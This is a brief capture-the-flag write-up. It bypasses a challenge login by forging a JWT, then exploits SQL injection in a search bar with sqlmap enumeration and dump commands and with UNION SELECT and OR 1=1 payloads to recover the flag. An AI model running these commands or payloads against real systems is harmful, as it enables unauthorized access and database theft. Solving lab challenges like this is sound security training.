# Challenge writeup
## You shall not pass!
The challenge begins with a login that has to be bypassed using JWT attacks. The bypass is needed in order to get Superior Officer privilege to pass to the second step and get the flag.

Modify the JWT token and add the new string in the cookie.

*[Image: jwt_encoder]*

Now your agent has Superior Officer privileges:

*[Image: senior_agent_view]*

After login bypass, the second step is to exploit the SQL injection present in the search bar.

One way is to use `sqlmap` to find the vulnerability. First, enumerate *tables* and *columns* by using the command:
```
sqlmap --cookie "token=<token>" -u https://<istance>/dashboard?q=<query> --tables --columns
```

*[Image: sqlmap_tables]*

Then, with the following input `' UNION SELECT null,value,null,null FROM flags --` it was possibile to read the `flags` table. However, the flag is not here.

*[Image: first_attempt_get_the_flag]*

Further attempts might involve to read the other tables e.g. communications with `' UNION SELECT null,subject,content,null FROM communications --` or simplier `' OR 1=1 --` .

*[Image: get_the_flag]*

By doing Ctrl+F you can find the WPCTF flag: 

*[Image: get_the_flag2]*

Another way is to directly dump the database using vulnerable parameter with `sqlmap`, using the following command:
```
sqlmap --cookie "token=<token> -u https://<istance>/dashboard?q=pp --dump
```
*[Image: dump_db]*